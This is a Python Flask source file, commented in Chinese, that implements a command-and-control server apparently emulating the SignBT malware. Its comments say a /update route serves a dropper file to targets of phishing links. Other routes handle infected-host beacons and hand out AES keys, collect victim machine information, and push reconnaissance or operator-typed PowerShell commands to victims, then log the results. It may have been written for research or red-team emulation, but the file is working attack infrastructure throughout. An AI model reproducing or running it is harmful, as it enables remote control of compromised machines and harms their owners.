from flask import Flask, request, jsonify, send_file
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import random
import base64
import os

app = Flask(__name__)

pending_command = None

# 釣魚郵件中的惡意鏈接會指向這個路由來提供惡意檔案
@app.route('/update', methods=['GET'])
def download_dropper():
    # 假設 signBT dropper 是一個可執行檔案，放在伺服器的某個目錄中
    dropper_path = 'signBT.sh'
    try:
        return send_file(dropper_path, as_attachment=True)
    except Exception as e:
        return str(e), 500

# @app.route('/receive_message', methods=['POST'])

# def receive_message():
#     data = request.json
#     message = data.get('message')

#     print("Received message:", message)
#     return jsonify({"status": "success"})
# 反向 XOR 操作，用來解密資料

def xor_data(data: bytes, key: bytes):
    return bytes([b1 ^ b2 for b1, b2 in zip(data, key)])
def generate_aes_key():
    # 產生 16 bytes AES 金鑰
    return get_random_bytes(16)

aes_key = generate_aes_key()

@app.route('/receive_data', methods=['POST'])
def receive_data():
    try:
        # 接收 payload
        payload = request.data.decode('utf-8')
        print("Payload:", payload)
        
        # 解析 payload，假設是以 '|' 分隔 base64 資料和隨機參數
        base64_data, *params = payload.split('|')
        
        # 將 base64 編碼的資料解碼
        decoded_data = base64.b64decode(base64_data)
        print("Decoded data:", decoded_data)
        
        decrypted_data = decoded_data[:24]
        # key = decoded_data[24:]

        # 前 24 bytes 是 XOR 後的資料，接著是 key（也是 24 bytes）
        # xor_encrypted_data = decoded_data[:24]
        # key = decoded_data[24:]
        
        # 解密資料，使用 XOR
        # decrypted_data = xor_data(xor_encrypted_data, key)
        # print("decrypted data:", decrypted_data)
        
        # 分析解密後的資料
        prefix = decrypted_data[:8].decode('utf-8')  # 固定前綴 (如 SIGNBTLG)
        md5_hash_part = decrypted_data[8:16]         # 主機名稱的 MD5 前 8 bytes
        random_id = decrypted_data[16:24]            # 隨機生成的識別碼
        
        # 打印解密後的資料，進行分析
        print(f"Prefix: {prefix}")
        print(f"MD5 Hash (partial): {md5_hash_part.hex()}")
        print(f"Random ID: {random_id.hex()}")
        
        # 根據 prefix 和狀態進行不同的處理邏輯
        if prefix == "SIGNBTLG":
            return jsonify({"status": "Initial connection received", "message": "success", "aes_key": base64.b64encode(aes_key).decode('utf-8')}), 200
        elif prefix == "SIGNBTKE":
            return jsonify({"status": "Key update successful, profiling requested", "message": "success"}), 200
        elif prefix == "SIGNBTGC":
            return jsonify({"status": "Command request received", "message": "keep"}), 200
        elif prefix == "SIGNBTFI":
            return jsonify({"status": "Operation failed", "message": "fail"}), 400
        elif prefix == "SIGNBTSR":
            return jsonify({"status": "Operation success", "message": "OK"}), 200
        else:
            return jsonify({"status": "Unknown prefix"}), 400
        
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"status": "Error processing data"}), 500

# expected_guid = "43 EB 8C BD 1D 98 3D 14" 
expected_guid = "d2f2c6aa-4be9-44b1-991c-1d020d90e16f"  
@app.route('/send_info', methods=['POST'])
def send_info():
    try:
        # 接收 victim info
        info = request.json
        print("Victim Info:", info)
        # print(info.get('machine_guid'))
        if info.get('machine_guid') == expected_guid:
            return jsonify({"status": "C2 server obtained victim info, and victim guid matches.", "message": "success"}), 200
        else:
            return jsonify({"status": "C2 server obtained victim info, but victim guid does not match.", "message": "fail"}), 200
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"status": "Error getting info"}), 500



# 模擬 命令參數
COMMAND_POOL = [
    "whoami",
    "ipconfig",
    "ipconfig /all",
    "ping www.google.com",  
    "Get-ComputerInfo", # get info
    "nslookup", 
    "ls",
    "netstat -an",
    "systeminfo",
    "get-process -name 'signBT' ",
    "get-process", 
    "Stop-Process -Name 'CalculatorApp' ",
    "gdr -PSProvider 'FileSystem' ", # getDriveList
    "arp -a",
    # "invoke-webrequest -uri "" -outfile "" ",
    # "kill -9 `jobs -ps`", #processkill

    # Add more commands as needed
]

# IV_LENGTH = 16
# # 生成隨機初始化向量 (IV)
# iv = os.urandom(IV_LENGTH)
# def encrypt_data(plain_text):
#     # 使用 AES.MODE_CBC 初始化加密器
#     cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    
#     # 填充明文（使用 PKCS7 填充方式）
#     padded_plain_text = pad_pkcs7(plain_text.encode('utf-8'))
    
#     # 加密資料
#     encrypted_data_bytes = cipher.encrypt(padded_plain_text)
    
#     # 將 IV 與加密數據拼接在一起，再進行 base64 編碼
#     encrypted_data = base64.b64encode(iv + encrypted_data_bytes).decode('utf-8')
    
#     return encrypted_data

# # PKCS7 填充
# def pad_pkcs7(data):
#     padding_len = 16 - (len(data) % 16)
#     return data + bytes([padding_len]) * padding_len

def encrypt_data(data):
    # 創建 AES CBC 加密器，並自動生成隨機 IV
    cipher = AES.new(aes_key, AES.MODE_CBC)
    
    # 對數據進行填充，然後加密
    ciphertext = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    
    # 將 IV 和密文一併 base64 編碼後返回
    return base64.b64encode(cipher.iv + ciphertext).decode('utf-8')

@app.route('/send_pending_command', methods=['POST'])
def send_pending_command():
    global pending_command
    pending_command = None
    command = input("Please input the command to send to the client: ")
    try:
        pending_command = command
        # 使用 AES 加密命令
        encrypted_command = encrypt_data(pending_command)
        print(f"Encrypted Command: {encrypted_command}")
        return jsonify({"status": "success", "command": pending_command, "type": "powershell"}), 200
    except Exception as e:
        print("No command provided.")
        print(f"Error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500
    
    # if pending_command:      
    #     return jsonify({"status": "success", "command": pending_command, "message": "Command sent to connected clients."})
    # else:
    #     return jsonify({"status": "error", "message": "No pending command to send."})

@app.route('/get_command', methods=['POST'])
def get_command():
    try:
        # 隨機從命令池中選擇一個命令
        selected_command = random.choice(COMMAND_POOL) # 改成可以讓server去input
        # selected_command = send_pending_command()

        # selected_command_as_bytes = str.encode(selected_command)
        selected_command_as_bytes = selected_command
        print(f"Selected Command: {selected_command_as_bytes}")

        # 使用 AES 加密命令
        encrypted_command = encrypt_data(selected_command_as_bytes)
        print(f"Encrypted Command: {encrypted_command}")

        return jsonify({"status": "success", "command": selected_command_as_bytes, "type": "powershell"}), 200

    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/report_success', methods=['POST'])
def report_success():
    try:
        data = request.json
        if data.get('status') == 'OK':
            print(f"Prefix: {data.get('prefix')}")
            print("Command executed successfully on victim.")
            print("Output:", data.get('output'))
        return jsonify({"status": "C2 server received success"}), 200

    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/report_failure', methods=['POST'])
def report_failure():
    try:
        data = request.json
        print(f"Prefix: {data.get('prefix')}")
        print(f"Command execution failed on victim: {data.get('reason')}")
        return jsonify({"status": "C2 server received failure"}), 200

    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)